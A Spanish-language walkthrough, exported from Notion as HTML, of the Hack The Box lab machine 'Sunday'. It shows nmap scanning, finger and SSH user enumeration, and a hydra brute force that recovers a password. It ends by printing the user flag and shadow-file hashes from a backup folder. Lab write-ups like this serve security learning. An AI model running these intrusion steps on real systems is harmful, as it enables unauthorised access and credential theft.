@@ -1,0 +1,832 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><link rel="icon" type="image/x-icon" href="assets/sunday.png" /><title>Sunday</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><link href="css/prism.css" rel="stylesheet"/>
+<body style="background-color: #E5E8E8"><head>
+  <style>
+    body {
+      background-image: url('assets/gris.jpg');
+      background-repeat: no-repeat;
+      background-size: cover;
+      background-attachment: fixed;
+    }
+  </style>
+</head><style>
+    body {
+      color: azure;
+    }
+  </style>
+
+<article id="2bd8fc75-0f66-42c9-9de3-2c12b9ae45fb" class="page sans"><header><img class="page-cover-image" src="https://www.notion.so/images/page-cover/gradients_3.png" style="object-position:center 60%"/><div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="Sunday%202bd8fc750f6642c99de32c12b9ae45fb/31746234.png"/></div><h1 class="page-title">Sunday</h1></header><div class="page-body"><p id="ff93e0c3-b121-4ad6-8c8b-f985b7f6ea53" class="">
+</p><figure id="4205f718-00dd-4989-a4ec-c731bfcd7619"><a href="https://app.hackthebox.com/machines/Sunday" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Hack The Box</div></div><div class="bookmark-href"><img src="https://app.hackthebox.com/images/HTB-favicon/favicon-32x32.png" class="icon bookmark-icon"/>https://app.hackthebox.com/machines/Sunday</div></div></a></figure><hr id="304ffcc9-8bf5-4205-92df-dc4b616b58a0"/><h2 id="7cbf3ae6-0434-455c-bf1e-79281ea65c56" class=""><mark class="highlight-blue">Intrusión</mark></h2><p id="b96061c6-d8dc-4070-a4df-5a8aa2ec8490" class="">Escaneo con Nmap para descubrir puertos abiertos en la máquina.</p><pre id="48a33c8b-097c-4f84-9892-3208ce164b6e" class="code"><code class="language-javascript">❯ nmap -p- --open 10.10.10.76
+Nmap scan report for 10.10.10.76
+Host is up (0.17s latency).
+PORT      STATE SERVICE
+79/tcp    open  finger
+111/tcp   open  rpcbind
+515/tcp   open  printer
+6787/tcp  open  smc-admin
+22022/tcp open  unknown</code></pre><ul id="5bacd9fd-4ad8-437c-a4bd-23898363ddcb" class="bulleted-list"><li style="list-style-type:disc">79/tcp open finger?</li></ul><ul id="0971fde2-99f6-46fb-9f03-b655c6be2f0d" class="bulleted-list"><li style="list-style-type:disc">11/tcp open rpcbind 2-4 (RPC #100000)</li></ul><ul id="b5afd1e5-08a1-48a0-9dfd-5caeb2837593" class="bulleted-list"><li style="list-style-type:disc">515/tcp open printer</li></ul><ul id="af0ce2c9-70cc-4d3b-b534-5b3c15911e14" class="bulleted-list"><li style="list-style-type:disc">6787/tcp open ssl/http Apache httpd 2.4.33 ((Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14)</li></ul><ul id="77512d5b-022f-4836-a3de-44f794ad9347" class="bulleted-list"><li style="list-style-type:disc">22022/tcp open ssh OpenSSH 7.5 (protocol 2.0)</li></ul><p id="94c735f1-541d-41a4-8034-c833934bfa7d" class="">
+</p><h3 id="dbc1d6c1-cdee-4744-9370-845a8e59d760" class=""><mark class="highlight-yellow">Enumerando Finger</mark></h3><p id="6ec6bf1f-d525-4907-944a-5b1388d323ca" class="">Finger es un servicio de red utilizado en sistemas operativos Unix y Linux para obtener información acerca de los usuarios del sistema. Este servicio permite a los usuarios de un sistema Unix o Linux obtener información básica sobre otros usuarios, como su nombre, dirección de correo electrónico, última hora de inicio de sesión y el terminal utilizado para conectarse al sistema.</p><p id="842d704f-5328-4fbe-a586-f012c5e8a448" class="">
+</p><p id="f8b7ca9b-d07d-440c-949a-7375af3cf9a5" class="">Empezamos listando posibles usuarios.</p><pre id="5e50cce5-6ca1-452b-a195-f284eecacffa" class="code"><code class="language-javascript">❯ finger @10.10.10.76
+No one logged on</code></pre><p id="80766a92-df33-4991-8c37-33609ba9f8db" class="">Pero no muestra nada.</p><p id="9e799c20-133b-45e6-9700-0be2f68bd7d5" class="">
+</p><p id="a7db6a6c-ca87-4cba-b3c2-a209423ffcc2" class="">Con netcat tratamos de conectarnos y podemos verificar si existen usuarios.</p><pre id="af74a403-34ca-4b74-aba6-5243541930fb" class="code"><code class="language-javascript">❯ nc -vn 10.10.10.76 79
+(UNKNOWN) [10.10.10.76] 79 (finger) open
+root
+Login       Name               TTY         Idle    When    Where
+root     Super-User            console      &lt;Oct 14, 2022&gt;</code></pre><p id="72facc4a-99ca-4533-919d-7b632cd01e27" class="">Para hacer esto mejor, existe una herramienta que podemos usar para enumerar mas usuarios. </p><p id="0a1e2001-027e-4783-896c-1e94fc7a2d7b" class="">
+</p><figure id="1e13ea10-b67b-4ff0-ad59-3bb73da816c5"><a href="https://pentestmonkey.net/tools/user-enumeration/finger-user-enum" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">finger-user-enum</div></div><div class="bookmark-href">https://pentestmonkey.net/tools/user-enumeration/finger-user-enum</div></div></a></figure><p id="6bbbb26b-50d9-4985-afd3-5d0735875426" class="">
+</p><p id="ed8d1ab0-c5e9-4d78-b194-a466c6f518e5" class="">Con esta herramienta podemos pasarle un nombre o una lista de usuarios y esperar para ver cuales existen y la información. </p><pre id="a5258b1f-8bb3-4a7f-83a4-8850110788df" class="code"><code class="language-javascript">❯ ./finger-user-enum.pl -u root -t 10.10.10.76
+Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Worker Processes ......... 5
+Target count ............. 1
+Username count ........... 1
+Target TCP port .......... 79
+Query timeout ............ 5 secs
+Relay Server ............. Not used
+
+######## Scan started #########
+root@10.10.10.76: root     Super-User            console      &lt;Oct 14, 2022&gt;..
+######## Scan completed #########
+1 results.
+
+1 queries in 1 seconds (1.0 queries / sec)</code></pre><p id="876b069d-ccaf-4dab-8bd0-d78b48b9dabc" class="">
+</p><pre id="f1adeda4-7f3a-4d34-8aa0-74bc513cde8e" class="code"><code class="language-javascript">❯ ./finger-user-enum.pl -U names.txt -t 10.10.10.76
+Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Worker Processes ......... 5
+Usernames file ........... names.txt
+Target count ............. 1
+Username count ........... 10177
+Target TCP port .......... 79
+Query timeout ............ 5 secs
+Relay Server ............. Not used
+
+######## Scan started #########
+access@10.10.10.76: access No Access User                     &lt; .  .  .  . &gt;..nobody4  SunOS 4.x NFS Anonym               &lt; .  .  .  . &gt;..
+admin@10.10.10.76: Login       Name               TTY         Idle    When    Where..adm      Admin                              &lt; .  .  .  . &gt;..dladm    Datalink Admin                     &lt; .  .  .  . &gt;..netadm   Network Admin                      &lt; .  .  .  . &gt;..netcfg   Network Configuratio               &lt; .  .  .  . &gt;..dhcpserv DHCP Configuration A               &lt; .  .  .  . &gt;..ikeuser  IKE Admin                          &lt; .  .  .  . &gt;..lp       Line Printer Admin                 &lt; .  .  .  . &gt;..
+anne marie@10.10.10.76: Login       Name               TTY         Idle    When    Where..anne                  ???..marie                 ???..
+bin@10.10.10.76: bin             ???                         &lt; .  .  .  . &gt;..
+dee dee@10.10.10.76: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
+ike@10.10.10.76: ikeuser  IKE Admin                          &lt; .  .  .  . &gt;..
+jo ann@10.10.10.76: Login       Name               TTY         Idle    When    Where..ann                   ???..jo                    ???..
+la verne@10.10.10.76: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
+line@10.10.10.76: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 &lt; .  .  .  . &gt;..
+message@10.10.10.76: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               &lt; .  .  .  . &gt;..
+miof mela@10.10.10.76: Login       Name               TTY         Idle    When    Where..mela                  ???..miof                  ???..
+root@10.10.10.76: root     Super-User            console      &lt;Oct 14, 2022&gt;..
+sammy@10.10.10.76: sammy           ???            ssh          &lt;Apr 13, 2022&gt; 10.10.14.13         ..
+sunny@10.10.10.76: sunny           ???            ssh          &lt;Apr 13, 2022&gt; 10.10.14.13         ..
+sys@10.10.10.76: sys             ???                         &lt; .  .  .  . &gt;..
+zsa zsa@10.10.10.76: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..
+######## Scan completed #########
+16 results.
+
+10177 queries in 775 seconds (13.1 queries / sec)</code></pre><p id="bdf1ffba-2ce5-4764-96b9-bd6c00ae12f6" class="">Con este escaneo vemos mas usuarios y su información. </p><p id="dcb6dd1c-a2cd-4ebc-b4ea-f9ab6cce83b2" class="">
+</p><h3 id="0ada07de-a1a2-43f4-be6f-8669117544cf" class=""><mark class="highlight-yellow">SSH</mark></h3><p id="504c8fc4-a967-4ea7-8e55-38e669b6b0e6" class="">El puerto del servicio Secure Shell esta configurado en el puerto 22022 y la versión es vulnerable a ‘user enumeration’.</p><blockquote id="19d49b34-20b1-4588-b3d3-379561e73fc7" class="">22022/tcp open ssh OpenSSH <mark class="highlight-red">7.5</mark> (protocol 2.0)</blockquote><p id="1b6b67d8-0437-4da3-b137-a95f3c6a4fea" class="">
+</p><p id="9ec64bcf-0e44-418c-94c4-c0b1aa535d1c" class="">Con la información del escaneo anterior vemos 2 usuarios conectados por SSH, sammy y sunny. Podríamos tratar de ver si son validos. </p><pre id="f5f530bb-0f4c-4db3-abca-97c2ecfae944" class="code"><code class="language-javascript">❯ python3 ssh_enum.py 10.10.10.76 -p 22022 sammy
+[+] sammy is a valid username
+❯ python3 ssh_enum.py 10.10.10.76 -p 22022 sunny
+[+] sunny is a valid username</code></pre><p id="af41c707-a853-40c9-881a-ac80a9926bea" class="">
+</p><p id="20ec0f16-8787-493f-bc53-e1cac32cc236" class="">Y los dos usuarios son validos, con lo que intentaría un ataque de fuerza bruta con hydra.</p><pre id="0a4a873c-0dff-4f8d-bf46-c82318d41911" class="code"><code class="language-javascript">❯ hydra -L users_ssh.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.76 -s 22022 -u -f
+Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes
+
+[DATA] attacking ssh://10.10.10.76:22022/
+[22022][ssh] host: 10.10.10.76   login: sunny   password: sunday
+[STATUS] attack finished for 10.10.10.76 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found</code></pre><p id="6664be50-2dd5-4cfb-9b3b-f337ec4899a7" class="">
+</p><p id="3ab69176-9651-4225-85fa-c648abbab3fe" class="">Obtenemos la contraseña del usuario sunny y iniciamos sesión por SSH.</p><pre id="3a8946c5-73c4-4fb6-ac23-5514c1871e3b" class="code"><code class="language-javascript">❯ ssh sunny@10.10.10.76 -p 22022
+Password: 
+Last login: Wed Apr 13 15:35:50 2022 from 10.10.14.13
+Oracle Corporation      SunOS 5.11      11.4    Aug 2018
+sunny@sunday:~$</code></pre><p id="d6975093-4015-4a4c-9d10-c8eb0185567a" class="">
+</p><p id="ad3d7e92-5d77-4180-982b-273bc83188f1" class="">En el directorio de sammy podemos ver la primera flag.</p><pre id="7d12cec9-cbd2-4e9e-913e-2b67f06fbfd4" class="code"><code class="language-javascript">sunny@sunday:/home/sammy$ ls
+user.txt
+sunny@sunday:/home/sammy$ cat user.txt 
+366740e21662974c853bd8ea933391d1
+sunny@sunday:/home/sammy$</code></pre><h2 id="e812a43f-1df5-4734-8ea8-2daf9cdd37db" class=""><mark class="highlight-blue">Elevando Privilegios</mark></h2><p id="06266ddf-4521-424c-8fae-79fb0843a80b" class="">En la raíz del sistema hay una carpeta llamada ‘backup’, nos metemos y hay 2 archivos de texto que contienen parte del archivo shadow del sistema.</p><pre id="7e59cebe-2017-45b7-945c-53fcd30fe3c3" class="code"><code class="language-javascript">sunny@sunday:/backup$ ls
+agent22.backup  shadow.backup
+sunny@sunday:/backup$ cat *
+mysql:NP:::::::
+openldap:*LK*:::::::
+webservd:*LK*:::::::
+postgres:NP:::::::
+svctag:*LK*:6445::::::
+nobody:*LK*:6445::::::
+noaccess:*LK*:6445::::::
+nobody4:*LK*:6445::::::
+sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
+sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
+mysql:NP:::::::
+openldap:*LK*:::::::
+webservd:*LK*:::::::
+postgres:NP:::::::
+svctag:*LK*:6445::::::
+nobody:*LK*:6445::::::
+noaccess:*LK*:6445::::::
+nobody4:*LK*:6445::::::
+sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
+sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
